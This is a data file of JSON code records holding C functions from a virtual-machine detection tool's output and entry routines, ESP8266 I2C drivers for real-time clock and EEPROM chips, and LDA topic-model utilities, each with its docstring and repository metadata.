{"docstring": "/*\n* PrintResult\n*\n* Purpose:\n*\n* Parse flags and output result.\n*\n*/\n", "func_signal": "VOID PrintResult(\n    _In_ LPWSTR Text,\n    _In_ DETECT_FLAG Flags\n)", "code": "{\n    SetConsoleTextAttribute(g_ConOut, FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY);\n    cuiPrintText(g_ConOut, Text, g_ConsoleOutput, TRUE);\n    SetConsoleTextAttribute(g_ConOut, g_csbi.wAttributes);\n\n    if (Flags == DETECT_BASE_NOTHING) {\n        SetConsoleTextAttribute(g_ConOut, FOREGROUND_GREEN | FOREGROUND_INTENSITY);\n        cuiPrintText(g_ConOut, TEXT(\"Nothing detected\"), g_ConsoleOutput, TRUE);\n        SetConsoleTextAttribute(g_ConOut, g_csbi.wAttributes);\n        return;\n    }\n\n    SetConsoleTextAttribute(g_ConOut, FOREGROUND_RED | FOREGROUND_INTENSITY);\n\n    if (Flags & DETECT_HYPERVISOR_BIT) {\n        cuiPrintText(g_ConOut, TEXT(\"Hypervisor Bit\"), g_ConsoleOutput, TRUE);\n    }\n    if (Flags & DETECT_DEVICE_OBJECT_NAME) {\n        cuiPrintText(g_ConOut, TEXT(\"Device Object Name\"), g_ConsoleOutput, TRUE);\n    }\n    if (Flags & DETECT_DRIVER_OBJECT_NAME) {\n        cuiPrintText(g_ConOut, TEXT(\"Driver Object Name\"), g_ConsoleOutput, TRUE);\n    }\n    if (Flags & DETECT_MUTEX_NAME) {\n        cuiPrintText(g_ConOut, TEXT(\"Mutex Object Name\"), g_ConsoleOutput, TRUE);\n    }\n    if (Flags & DETECT_PORT_NAME) {\n        cuiPrintText(g_ConOut, TEXT(\"Port Object Name\"), g_ConsoleOutput, TRUE);\n    }\n    if (Flags & DETECT_DIRECTORY_OBJECT_NAME) {\n        cuiPrintText(g_ConOut, TEXT(\"Object Directory Name\"), g_ConsoleOutput, TRUE);\n    }\n    if (Flags & DETECT_HANDLE_TABLE) {\n        cuiPrintText(g_ConOut, TEXT(\"Handle Table\"), g_ConsoleOutput, TRUE);\n    }\n    if (Flags & DETECT_MEMORY_TAG) {\n        cuiPrintText(g_ConOut, TEXT(\"Memory Tag\"), g_ConsoleOutput, TRUE);\n    }\n    if (Flags & DETECT_VIRTUAL_REGISTRY) {\n        cuiPrintText(g_ConOut, TEXT(\"Virtual Registry\"), g_ConsoleOutput, TRUE);\n    }\n    if (Flags & DETECT_INSTRUCTION_BACKDOOR) {\n        cuiPrintText(g_ConOut, TEXT(\"Instruction Backdoor\"), g_ConsoleOutput, TRUE);\n    }\n    if (Flags & DETECT_SIGNATURE_SCAN_FIRM) {\n        cuiPrintText(g_ConOut, TEXT(\"Signature Scan Firmware\"), g_ConsoleOutput, TRUE);\n    }\n    if (Flags & DETECT_SIGNATURE_SCAN_RSMB) {\n        cuiPrintText(g_ConOut, TEXT(\"Signature Scan RSMB\"), g_ConsoleOutput, TRUE);\n    }\n    if (Flags & DETECT_PCI_HWID) {\n        cuiPrintText(g_ConOut, TEXT(\"PCI Hardware ID\"), g_ConsoleOutput, TRUE);\n    }\n    SetConsoleTextAttribute(g_ConOut, g_csbi.wAttributes);\n}", "path": "src\\vmde\\main.c", "repo_name": "hfiref0x/VMDE", "stars": 163, "license": "mit", "language": "c", "size": 917}
{"docstring": "/*\n* main\n*\n* Purpose:\n*\n* Program entry point.\n*\n*/\n", "func_signal": "VOID main(\n    VOID\n)", "code": "{\n    DWORD l;\n    INPUT_RECORD inp1;\n    WCHAR szOutput[100];\n\n    __security_init_cookie();\n\n    g_ConOut = GetStdHandle(STD_OUTPUT_HANDLE);\n    if (g_ConOut != INVALID_HANDLE_VALUE) {\n\n        g_ConsoleOutput = TRUE;\n        if (!GetConsoleMode(g_ConOut, &l)) {\n            g_ConsoleOutput = FALSE;\n        }\n\n        SetConsoleMode(g_ConOut, ENABLE_LINE_INPUT | ENABLE_ECHO_INPUT | ENABLE_PROCESSED_OUTPUT);\n        if (g_ConsoleOutput == FALSE) {\n            WriteFile(g_ConOut, &g_BE, sizeof(WCHAR), &l, NULL);\n        }\n        g_csbi.wAttributes = 0;\n        GetConsoleScreenBufferInfo(g_ConOut, &g_csbi);\n\n        cuiClrScr(g_ConOut);\n\n        DetectSystemInfo();\n\n        InitializeListHead(&VendorsListHead);\n\n        EnumPCIDevsReg();\n\n        DetectVMS();\n\n#ifdef _DEBUG\n        DumpFirmwareTable();\n#endif\n\n        g_ConIn = GetStdHandle(STD_INPUT_HANDLE);\n        if (g_ConIn != INVALID_HANDLE_VALUE) {\n            _strcpy(szOutput, TEXT(\"\\nPress Enter for exit\"));\n            cuiPrintText(g_ConOut, szOutput, g_ConsoleOutput, TRUE);\n            RtlSecureZeroMemory(&inp1, sizeof(inp1));\n            ReadConsoleInput(GetStdHandle(STD_INPUT_HANDLE), &inp1, 1, &l);\n            ReadConsole(g_ConIn, &szOutput, 1, &l, NULL);\n        }\n    }\n\n    ExitProcess((UINT)0);\n}", "path": "src\\vmde\\main.c", "repo_name": "hfiref0x/VMDE", "stars": 163, "license": "mit", "language": "c", "size": 917}
{"docstring": "/*\n* DumpFirmwareTable\n*\n* Purpose:\n*\n* Dump firmware tables to the disk, DEBUG only routine.\n*\n*/\n", "func_signal": "VOID DumpFirmwareTable(\n    VOID\n)", "code": "{\n    HANDLE hFile;\n    ULONG dwDataSize = 0L, bytesIO;\n    SYSTEM_FIRMWARE_TABLE_INFORMATION *sfti = NULL;\n\n    sfti = (PSYSTEM_FIRMWARE_TABLE_INFORMATION)supGetFirmwareTable(&dwDataSize, FIRM, 0xC0000);\n    if (sfti) {\n        hFile = CreateFile(TEXT(\"firm.dat\"), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);\n        if (hFile != INVALID_HANDLE_VALUE) {\n            WriteFile(hFile, sfti, dwDataSize, &bytesIO, NULL);\n            CloseHandle(hFile);\n        }\n        HeapFree(GetProcessHeap(), 0, sfti);\n    }\n\n    sfti = (PSYSTEM_FIRMWARE_TABLE_INFORMATION)supGetFirmwareTable(&dwDataSize, RSMB, 0);\n    if (sfti) {\n        hFile = CreateFile(TEXT(\"rsmb.dat\"), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);\n        if (hFile != INVALID_HANDLE_VALUE) {\n            WriteFile(hFile, sfti, dwDataSize, &bytesIO, NULL);\n            CloseHandle(hFile);\n        }\n        HeapFree(GetProcessHeap(), 0, sfti);\n    }\n}", "path": "src\\vmde\\detect.c", "repo_name": "hfiref0x/VMDE", "stars": 163, "license": "mit", "language": "c", "size": 917}
{"docstring": "// set/clear bits in a byte register, or replace the byte altogether\n// pass the register address to modify, a byte to replace the existing\n// value with or containing the bits to set/clear and one of\n// DS1307_SET/DS1307_CLEAR/DS1307_REPLACE\n// returns true to indicate success\n", "func_signal": "bool ICACHE_FLASH_ATTR ds1307_setFlag(uint8 addr, uint8 bits, uint8 mode)", "code": "{\n\tuint8 data[2];\n\tdata[0] = addr;\n\t// get status register\n\tif (ds1307_send(data, 1) && ds1307_recv(data+1, 1)) {\n\t\t// clear the flag\n\t\tif (mode == DS1307_REPLACE) data[1] = bits;\n\t\telse if (mode == DS1307_SET) data[1] |= bits;\n\t\telse data[1] &= ~bits;\n\t\tif (ds1307_send(data, 2)) {\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}", "path": "drivers\\ds1307.c", "repo_name": "raburton/esp8266", "stars": 180, "license": "None", "language": "c", "size": 242}
{"docstring": "// set an area of eeprom to specified value (like memset)\n// optionally wait for completion of last write\n", "func_signal": "bool ICACHE_FLASH_ATTR at24c_setBytes(uint16 addr, uint8 val, uint16 len, bool wait)", "code": "{\n\n\tuint8 wlen;\n\tuint8 data[AT24C_PAGESIZE];\n\n\t// set the temp write buffer to user's choice of value\n\tos_memset(data, val, AT24C_PAGESIZE);\n\n\t// work out number of bytes available in starting page\n\twlen = AT24C_PAGESIZE - (addr % AT24C_PAGESIZE);\n\t// is that more than we actually need?\n\tif (wlen > len) wlen = len;\n\n\twhile(wlen > 0) {\n\t\t// reduce remaining length\n\t\tlen -= wlen;\n\t\t// write the page\n\t\tif (!at24c_writeInPage(addr, data, wlen, (len > 0 ? true : wait))) {\n\t\t\treturn false;\n\t\t}\n\t\t// advance the eeprom address\n\t\taddr += wlen;\n\t\t// work out how much to write next time\n\t\twlen = (len < AT24C_PAGESIZE ? len : AT24C_PAGESIZE);\n\t}\n\n\treturn true;\n}", "path": "drivers\\at24c.c", "repo_name": "raburton/esp8266", "stars": 180, "license": "None", "language": "c", "size": 242}
{"docstring": "// read from the current position\n// returns true to indicate success\n", "func_signal": "bool ICACHE_FLASH_ATTR at24c_readNextBytes(uint8 *data, uint16 len)", "code": "{\n\n\tint loop;\n\n\t// signal i2c start\n\ti2c_master_start();\n\n\t// write i2c address & direction\n\ti2c_master_writeByte((uint8)((AT24C_ADDR << 1) | 1));\n\tif (!i2c_master_checkAck()) {\n\t\t//uart0_send(\"i2c error\\r\\n\");\n\t\ti2c_master_stop();\n\t\treturn false;\n\t}\n\n\t// read bytes\n\tfor (loop = 0; loop < len; loop++) {\n\t\tdata[loop] = i2c_master_readByte();\n\t\t// send ack (except after last byte, then we send nack)\n\t\tif (loop < (len - 1)) i2c_master_send_ack(); else i2c_master_send_nack();\n\t}\n\n\t// signal i2c stop\n\ti2c_master_stop();\n\n\treturn true;\n}", "path": "drivers\\at24c.c", "repo_name": "raburton/esp8266", "stars": 180, "license": "None", "language": "c", "size": 242}
{"docstring": "// send a number of bytes to the rtc over i2c\n// returns true to indicate success\n", "func_signal": "static bool ICACHE_FLASH_ATTR ds1307_send(uint8 *data, uint8 len)", "code": "{\n\n\tint loop;\n\n\t// signal i2c start\n\ti2c_master_start();\n\n\t// write address & direction\n\ti2c_master_writeByte((uint8)(DS1307_ADDR << 1));\n\tif (!i2c_master_checkAck()) {\n\t\t//uart0_send(\"i2c error1\\r\\n\");\n\t\ti2c_master_stop();\n\t\treturn false;\n\t}\n\n\t// send the data\n\tfor (loop = 0; loop < len; loop++) {\n\t\ti2c_master_writeByte(data[loop]);\n\t\tif (!i2c_master_checkAck()) {\n\t\t\t//uart0_send(\"i2c error2\\r\\n\");\n\t\t\ti2c_master_stop();\n\t\t\treturn false;\n\t\t}\n\t}\n\n\t// signal i2c stop\n\ti2c_master_stop();\n\n\treturn true;\n\n}", "path": "drivers\\ds1307.c", "repo_name": "raburton/esp8266", "stars": 180, "license": "None", "language": "c", "size": 242}
{"docstring": "// set the time on the rtc\n// timezone agnostic, pass whatever you like\n// I suggest using GMT and applying timezone and DST when read back\n// returns true to indicate success\n", "func_signal": "bool ICACHE_FLASH_ATTR ds1307_setTime(struct tm *time)", "code": "{\n\t\n\tuint8 data[8];\n\n\t// start register\n\tdata[0] = DS1307_ADDR_TIME;\n\t// time/date data\n\tdata[1] = decToBcd(time->tm_sec);\n\tdata[2] = decToBcd(time->tm_min);\n\tdata[3] = decToBcd(time->tm_hour);\n\tdata[4] = decToBcd(time->tm_wday + 1);\n\tdata[5] = decToBcd(time->tm_mday);\n\tdata[6] = decToBcd(time->tm_mon + 1);\n\tdata[7] = decToBcd(time->tm_year - 100);\n\n\treturn ds1307_send(data, 8);\n\n}", "path": "drivers\\ds1307.c", "repo_name": "raburton/esp8266", "stars": 180, "license": "None", "language": "c", "size": 242}
{"docstring": "// send a number of bytes to the rtc over i2c\n// returns true to indicate success\n", "func_signal": "static bool ICACHE_FLASH_ATTR ds3231_send(uint8 *data, uint8 len)", "code": "{\n\t\n\tint loop;\n\n\t// signal i2c start\n\ti2c_master_start();\n\n\t// write address & direction\n\ti2c_master_writeByte((uint8)(DS3231_ADDR << 1));\n\tif (!i2c_master_checkAck()) {\n\t\t//uart0_send(\"i2c error\\r\\n\");\n\t\ti2c_master_stop();\n\t\treturn false;\n\t}\n\n\t// send the data\n\tfor (loop = 0; loop < len; loop++) {\n\t\ti2c_master_writeByte(data[loop]);\n\t\tif (!i2c_master_checkAck()) {\n\t\t\t//uart0_send(\"i2c error\\r\\n\");\n\t\t\ti2c_master_stop();\n\t\t\treturn false;\n\t\t}\n\t}\n\n\t// signal i2c stop\n\ti2c_master_stop();\n\n\treturn true;\n\n}", "path": "drivers\\ds3231.c", "repo_name": "raburton/esp8266", "stars": 180, "license": "None", "language": "c", "size": 242}
{"docstring": "// writes across pages\n// you do not need to worry about how long your data is or where you\n// are writing it as it will be written in multiple parts across\n// successive pages, optionally waiting for the last write to complete\n// (we always have to wait for any earlier writes to complete)\n// note: does not check if you are trying to write past the end of the\n// eeprom!\n// returns true to indicate success\n", "func_signal": "bool ICACHE_FLASH_ATTR at24c_writeAcrossPages(uint16 addr, uint8* data, uint16 len, bool wait)", "code": "{\n\n\tuint8 wlen;\n\n\t// work out number of bytes available in starting page\n\twlen = AT24C_PAGESIZE - (addr % AT24C_PAGESIZE);\n\t// is that more than we actually need?\n\tif (wlen > len) wlen = len;\n\n\twhile(wlen > 0) {\n\t\t// reduce remaining length\n\t\tlen -= wlen;\n\t\t// write the page\n\t\tif (!at24c_writeInPage(addr, data, wlen, (len > 0 ? true : wait))) {\n\t\t\treturn false;\n\t\t}\n\t\t// advance the eeprom address and our data pointer\n\t\taddr += wlen;\n\t\tdata += wlen;\n\t\t// work out how much to write next time\n\t\twlen = (len < AT24C_PAGESIZE ? len : AT24C_PAGESIZE);\n\t}\n\n\treturn true;\n}", "path": "drivers\\at24c.c", "repo_name": "raburton/esp8266", "stars": 180, "license": "None", "language": "c", "size": 242}
{"docstring": "// read a number of bytes from the rtc over i2c\n// returns true to indicate success\n", "func_signal": "static bool ICACHE_FLASH_ATTR ds3231_recv(uint8 *data, uint8 len)", "code": "{\n\t\n\tint loop;\n\n\t// signal i2c start\n\ti2c_master_start();\n\n\t// write address & direction\n\ti2c_master_writeByte((uint8)((DS3231_ADDR << 1) | 1));\n\tif (!i2c_master_checkAck()) {\n\t\t//uart0_send(\"i2c error\\r\\n\");\n\t\ti2c_master_stop();\n\t\treturn false;\n\t}\n\n\t// read bytes\n\tfor (loop = 0; loop < len; loop++) {\n\t\tdata[loop] = i2c_master_readByte();\n\t\t// send ack (except after last byte, then we send nack)\n\t\tif (loop < (len - 1)) i2c_master_send_ack(); else i2c_master_send_nack();\n\t}\n\n\t// signal i2c stop\n\ti2c_master_stop();\n\n\treturn true;\n\n}", "path": "drivers\\ds3231.c", "repo_name": "raburton/esp8266", "stars": 180, "license": "None", "language": "c", "size": 242}
{"docstring": "// enable and set output level (disabled squarewave)\n// returns true to indicate success\n", "func_signal": "bool ICACHE_FLASH_ATTR ds1307_enableOutout(uint8 level)", "code": "{\n\tuint8 flag = 0;\n\tif (ds1307_getFlag(DS1307_ADDR_CONTROL, 0xff, &flag)) {\n\t\t// clear squarewave flag (to enable output) and current level\n\t\tflag &= ~(DS1307_CTRL_SQUAREWAVE | DS1307_OUTPUT_LEVEL_1);\n\t\t// set the output level\n\t\tflag |= level;\n\t\treturn ds1307_setFlag(DS1307_ADDR_CONTROL, flag, DS1307_REPLACE);\n\t}\n\treturn false;\n}", "path": "drivers\\ds1307.c", "repo_name": "raburton/esp8266", "stars": 180, "license": "None", "language": "c", "size": 242}
{"docstring": "// get the temerapture as a float (in quarter degree increments)\n// returns true to indicate success\n", "func_signal": "bool ICACHE_FLASH_ATTR ds3231_getTempFloat(float *temp)", "code": "{\n\tuint8 data[2];\n\tdata[0] = DS3231_ADDR_TEMP;\n\t// get integer part and quarters of the temp\n\tif (ds3231_send(data, 1) && ds3231_recv(data, 2)) {\n\t\t*temp = ((signed)data[0]) + (((unsigned)(data[1]) >> 6) * 0.25);\n\t\treturn true;\n\t}\n\treturn false;\n}", "path": "drivers\\ds3231.c", "repo_name": "raburton/esp8266", "stars": 180, "license": "None", "language": "c", "size": 242}
{"docstring": "// set the current data address, this is the start of the write command\n// next either send the data to be written, or start a read instead\n// returns true to indicate success\n", "func_signal": "static bool ICACHE_FLASH_ATTR at24c_setAddr(uint16 addr)", "code": "{\n\n\tuint8 loop;\n\tuint8 data[2];\n\n\t// signal i2c start\n\ti2c_master_start();\n\n\t// write i2c address & direction\n\ti2c_master_writeByte((uint8)(AT24C_ADDR << 1));\n\tif (!i2c_master_checkAck()) {\n\t\t//uart0_send(\"i2c error\\r\\n\");\n\t\ti2c_master_stop();\n\t\treturn false;\n\t}\n\n\t// write data address\n\tdata[0] = (uint8)(((unsigned)addr) >> 8);\n\tdata[1] = (uint8)(((unsigned)addr) & 0xff);\n\tfor (loop = 0; loop < 2; loop++) {\n\t\ti2c_master_writeByte(data[loop]);\n\t\tif (!i2c_master_checkAck()) {\n\t\t\t//uart0_send(\"i2c error\\r\\n\");\n\t\t\ti2c_master_stop();\n\t\t\treturn false;\n\t\t}\n\t}\n\n\treturn true;\n}", "path": "drivers\\at24c.c", "repo_name": "raburton/esp8266", "stars": 180, "license": "None", "language": "c", "size": 242}
{"docstring": "// read from anywhere\n// sets the address then does a normal read\n// returns true to indicate success\n", "func_signal": "bool ICACHE_FLASH_ATTR at24c_readBytes(uint16 addr, uint8 *data, uint16 len)", "code": "{\n\t// set data address\n\tif (!at24c_setAddr(addr)) return false;\n\t// perform the read\n\treturn at24c_readNextBytes(data, len);\n}", "path": "drivers\\at24c.c", "repo_name": "raburton/esp8266", "stars": 180, "license": "None", "language": "c", "size": 242}
{"docstring": "// get the time from the rtc, populates a supplied tm struct\n// returns true to indicate success\n", "func_signal": "bool ICACHE_FLASH_ATTR ds1307_getTime(struct tm *time)", "code": "{\n\n\tint loop;\n\tuint8 data[7];\n\n\t// start register address\n\tdata[0] = DS1307_ADDR_TIME;\n\tif (!ds1307_send(data, 1)) {\n\t\treturn false;\n\t}\n\n\t// read time\n\tif (!ds1307_recv(data, 7)) {\n\t\treturn false;\n\t}\n\n\t// convert to unix time structure\n\ttime->tm_sec = bcdToDec(data[0]);\n\ttime->tm_min = bcdToDec(data[1]);\n\tif (data[2] & DS1307_12HOUR_FLAG) {\n\t\t// 12h\n\t\ttime->tm_hour = bcdToDec(data[2] & DS1307_12HOUR_MASK);\n\t\t// pm?\n\t\tif (data[2] & DS1307_PM_FLAG) time->tm_hour += 12;\n\t} else {\n\t\t// 24h\n\t\ttime->tm_hour = bcdToDec(data[2]);\n\t}\n\ttime->tm_wday = bcdToDec(data[3]) - 1;\n\ttime->tm_mday = bcdToDec(data[4]);\n\ttime->tm_mon  = bcdToDec(data[5]) - 1;\n\ttime->tm_year = bcdToDec(data[6]) + 100;\n\ttime->tm_isdst = 0;\n\n\t// apply a time zone (if you are not using localtime on the rtc or you want to check/apply DST)\n\t//applyTZ(time);\n\n\treturn true;\n\t\n}", "path": "drivers\\ds1307.c", "repo_name": "raburton/esp8266", "stars": 180, "license": "None", "language": "c", "size": 242}
{"docstring": "// set the time on the rtc\n// timezone agnostic, pass whatever you like\n// I suggest using GMT and applying timezone and DST when read back\n// returns true to indicate success\n", "func_signal": "bool ICACHE_FLASH_ATTR ds3231_setTime(struct tm *time)", "code": "{\n\t\n\tuint8 data[8];\n\n\t// start register\n\tdata[0] = DS3231_ADDR_TIME;\n\t// time/date data\n\tdata[1] = decToBcd(time->tm_sec);\n\tdata[2] = decToBcd(time->tm_min);\n\tdata[3] = decToBcd(time->tm_hour);\n\tdata[4] = decToBcd(time->tm_wday + 1);\n\tdata[5] = decToBcd(time->tm_mday);\n\tdata[6] = decToBcd(time->tm_mon + 1);\n\tdata[7] = decToBcd(time->tm_year - 100);\n\n\treturn ds3231_send(data, 8);\n\n}", "path": "drivers\\ds3231.c", "repo_name": "raburton/esp8266", "stars": 180, "license": "None", "language": "c", "size": 242}
{"docstring": "// get the temperature as an integer (rounded down)\n// returns true to indicate success\n", "func_signal": "bool ICACHE_FLASH_ATTR ds3231_getTempInteger(int8 *temp)", "code": "{\n\tuint8 data[1];\n\tdata[0] = DS3231_ADDR_TEMP;\n\t// get just the integer part of the temp\n\tif (ds3231_send(data, 1) && ds3231_recv(data, 1)) {\n\t\t*temp = (signed)data[0];\n\t\treturn true;\n\t}\n\treturn false;\n}", "path": "drivers\\ds3231.c", "repo_name": "raburton/esp8266", "stars": 180, "license": "None", "language": "c", "size": 242}
{"docstring": "// write within a page\n// note if you try to write past a page boundary the write will\n// wrap back to the start of the same page, so you need to know\n// how much you're writing and where you're writing it to\n// you don't need to start writing at the start of a page, but if you\n// start in the middle you'll be able to write less before wrapping\n// optionally wait for the eeprom to complete the write\n// returns true to indicate success\n", "func_signal": "bool ICACHE_FLASH_ATTR at24c_writeInPage(uint16 addr, uint8* data, uint8 len, bool wait)", "code": "{\n\n\tint loop;\n\n\t// set data address (includes i2c setup,\n\t// so no need to call i2c_master_start here)\n\tif (!at24c_setAddr(addr)) return false;\n\n\t// send the data\n\tfor (loop = 0; loop < len; loop++) {\n\t\ti2c_master_writeByte(data[loop]);\n\t\tif (!i2c_master_checkAck()) {\n\t\t\t//uart0_send(\"i2c error\\r\\n\");\n\t\t\ti2c_master_stop();\n\t\t\treturn false;\n\t\t}\n\t}\n\n\t// signal i2c stop\n\ti2c_master_stop();\n\n\t// optionally, wait until the eeprom signals the write is finished\n\tif (wait) at24c_writeWait();\n\n\treturn true;\n}", "path": "drivers\\at24c.c", "repo_name": "raburton/esp8266", "stars": 180, "license": "None", "language": "c", "size": 242}
{"docstring": "// get a byte containing just the requested bits\n// pass the register address to read, a mask to apply to the register and\n// an uint* for the output\n// you can test this value directly as true/false for specific bit mask\n// of use a mask of 0xff to just return the whole register byte\n// returns true to indicate success\n", "func_signal": "bool ICACHE_FLASH_ATTR ds1307_getFlag(uint8 addr, uint8 mask, uint8 *flag)", "code": "{\n\tuint8 data[1];\n\t// get register\n\tdata[0] = addr;\n\tif (ds1307_send(data, 1) && ds1307_recv(data, 1)) {\n\t\t// return only requested flag\n\t\t*flag = (data[0] & mask);\n\t\treturn true;\n\t}\n\treturn false;\n}", "path": "drivers\\ds1307.c", "repo_name": "raburton/esp8266", "stars": 180, "license": "None", "language": "c", "size": 242}
{"docstring": "// get the time from the rtc, populates a supplied tm struct\n// returns true to indicate success\n", "func_signal": "bool ICACHE_FLASH_ATTR ds3231_getTime(struct tm *time)", "code": "{\n\t\n\tint loop;\n\tuint8 data[7];\n\n\t// start register address\n\tdata[0] = DS3231_ADDR_TIME;\n\tif (!ds3231_send(data, 1)) {\n\t\treturn false;\n\t}\n\n\t// read time\n\tif (!ds3231_recv(data, 7)) {\n\t\treturn false;\n\t}\n\n\t// convert to unix time structure\n\ttime->tm_sec = bcdToDec(data[0]);\n\ttime->tm_min = bcdToDec(data[1]);\n\tif (data[2] & DS3231_12HOUR_FLAG) {\n\t\t// 12h\n\t\ttime->tm_hour = bcdToDec(data[2] & DS3231_12HOUR_MASK);\n\t\t// pm?\n\t\tif (data[2] & DS3231_PM_FLAG) time->tm_hour += 12;\n\t} else {\n\t\t// 24h\n\t\ttime->tm_hour = bcdToDec(data[2]);\n\t}\n\ttime->tm_wday = bcdToDec(data[3]) - 1;\n\ttime->tm_mday = bcdToDec(data[4]);\n\ttime->tm_mon  = bcdToDec(data[5] & DS3231_MONTH_MASK) - 1;\n\ttime->tm_year = bcdToDec(data[6]) + 100;\n\ttime->tm_isdst = 0;\n\n\t// apply a time zone (if you are not using localtime on the rtc or you want to check/apply DST)\n\t//applyTZ(time);\n\n\treturn true;\n\t\n}", "path": "drivers\\ds3231.c", "repo_name": "raburton/esp8266", "stars": 180, "license": "None", "language": "c", "size": 242}
{"docstring": "// set the frequency of the squarewave output (but does not enable it)\n// pass DS3231_SQUAREWAVE_RATE_1HZ/DS3231_SQUAREWAVE_RATE_1024HZ/DS3231_SQUAREWAVE_RATE_4096HZ/DS3231_SQUAREWAVE_RATE_8192HZ\n// returns true to indicate success\n", "func_signal": "bool ICACHE_FLASH_ATTR ds3231_setSquarewaveFreq(uint8 freq)", "code": "{\n\tuint8 flag = 0;\n\tif (ds3231_getFlag(DS3231_ADDR_CONTROL, 0xff, &flag)) {\n\t\t// clear current rate\n\t\tflag &= ~DS3231_CTRL_SQWAVE_8192HZ;\n\t\t// set new rate\n\t\tflag |= freq;\n\t\treturn ds3231_setFlag(DS3231_ADDR_CONTROL, flag, DS3231_REPLACE);\n\t}\n\treturn false;\n}", "path": "drivers\\ds3231.c", "repo_name": "raburton/esp8266", "stars": 180, "license": "None", "language": "c", "size": 242}
{"docstring": "// set the frequency of the squarewave output (but does not enable it)\n// pass DS1307_SQUAREWAVE_RATE_1HZ/DS1307_SQUAREWAVE_RATE_1024HZ/DS1307_SQUAREWAVE_RATE_4096HZ/DS1307_SQUAREWAVE_RATE_8192HZ\n// returns true to indicate success\n", "func_signal": "bool ICACHE_FLASH_ATTR ds1307_setSquarewaveFreq(uint8 freq)", "code": "{\n\tuint8 flag = 0;\n\tif (ds1307_getFlag(DS1307_ADDR_CONTROL, 0xff, &flag)) {\n\t\t// clear current rate\n\t\tflag &= ~DS1307_CTRL_SQWAVE_32768HZ;\n\t\t// set new rate\n\t\tflag |= freq;\n\t\treturn ds1307_setFlag(DS1307_ADDR_CONTROL, flag, DS1307_REPLACE);\n\t}\n\treturn false;\n}", "path": "drivers\\ds1307.c", "repo_name": "raburton/esp8266", "stars": 180, "license": "None", "language": "c", "size": 242}
{"docstring": "/*\n * objective function and its derivatives\n *\n */\n", "func_signal": "double alhood(double a, double ss, int D, int K)", "code": "{ return(D * (lgamma(K * a) - K * lgamma(a)) + (a - 1) * ss); }\n\ndouble d_alhood(double a, double ss, int D, int K)\n{ return(D * (K * digamma(K * a) - K * digamma(a)) + ss); }\n\ndouble d2_alhood(double a, int D, int K)\n{ return(D * (K * K * trigamma(K * a) - K * trigamma(a))); }\n\n\n/*\n * newtons method\n *\n */\n\ndouble opt_alpha(double ss, int D, int K)\n{\n    double a, log_a, init_a = 100;\n    double f, df, d2f;\n    int iter = 0;\n\n    log_a = log(init_a);\n    do\n    {\n        iter++;\n        a = exp(log_a);\n        if (isnan(a))\n        {\n            init_a = init_a * 10;\n            printf(\"warning : alpha is nan; new init = %5.5f\\n\", init_a);\n            a = init_a;\n            log_a = log(a);\n        }\n        f = alhood(a, ss, D, K);\n        df = d_alhood(a, ss, D, K);\n        d2f = d2_alhood(a, D, K);\n        log_a = log_a - df/(d2f * a + df);\n        printf(\"alpha maximization : %5.5f   %5.5f\\n\", f, df);\n    }\n    while ((fabs(df) > NEWTON_THRESH) && (iter < MAX_ALPHA_ITER));\n    return(exp(log_a));\n}", "path": "lda-alpha.c", "repo_name": "blei-lab/lda-c", "stars": 159, "license": "lgpl-2.1", "language": "c", "size": 5780}
{"docstring": "/*\n * compute likelihood bound\n *\n */\n", "func_signal": "double\ncompute_likelihood(document* doc, lda_model* model, double** phi, double* var_gamma)", "code": "{\n    double likelihood = 0, digsum = 0, var_gamma_sum = 0, dig[model->num_topics];\n    int k, n;\n\n    for (k = 0; k < model->num_topics; k++)\n    {\n\tdig[k] = digamma(var_gamma[k]);\n\tvar_gamma_sum += var_gamma[k];\n    }\n    digsum = digamma(var_gamma_sum);\n\n    likelihood =\n\tlgamma(model->alpha * model -> num_topics)\n\t- model -> num_topics * lgamma(model->alpha)\n\t- (lgamma(var_gamma_sum));\n\n    for (k = 0; k < model->num_topics; k++)\n    {\n\tlikelihood +=\n\t    (model->alpha - 1)*(dig[k] - digsum) + lgamma(var_gamma[k])\n\t    - (var_gamma[k] - 1)*(dig[k] - digsum);\n\n\tfor (n = 0; n < doc->length; n++)\n\t{\n            if (phi[n][k] > 0)\n            {\n                likelihood += doc->counts[n]*\n                    (phi[n][k]*((dig[k] - digsum) - log(phi[n][k])\n                                + model->log_prob_w[k][doc->words[n]]));\n            }\n        }\n    }\n    return(likelihood);\n}", "path": "lda-inference.c", "repo_name": "blei-lab/lda-c", "stars": 159, "license": "lgpl-2.1", "language": "c", "size": 5780}
{"docstring": "/*\n * saves the gamma parameters of the current dataset\n *\n */\n", "func_signal": "void save_gamma(char* filename, double** gamma, int num_docs, int num_topics)", "code": "{\n    FILE* fileptr;\n    int d, k;\n    fileptr = fopen(filename, \"w\");\n\n    for (d = 0; d < num_docs; d++)\n    {\n\tfprintf(fileptr, \"%5.10f\", gamma[d][0]);\n\tfor (k = 1; k < num_topics; k++)\n\t{\n\t    fprintf(fileptr, \" %5.10f\", gamma[d][k]);\n\t}\n\tfprintf(fileptr, \"\\n\");\n    }\n    fclose(fileptr);\n}", "path": "lda-estimate.c", "repo_name": "blei-lab/lda-c", "stars": 159, "license": "lgpl-2.1", "language": "c", "size": 5780}
{"docstring": "/*\n * given log(a) and log(b), return log(a + b)\n *\n */\n", "func_signal": "double log_sum(double log_a, double log_b)", "code": "{\n  double v;\n\n  if (log_a < log_b)\n  {\n      v = log_b+log(1 + exp(log_a-log_b));\n  }\n  else\n  {\n      v = log_a+log(1 + exp(log_b-log_a));\n  }\n  return(v);\n}", "path": "utils.c", "repo_name": "blei-lab/lda-c", "stars": 159, "license": "lgpl-2.1", "language": "c", "size": 5780}
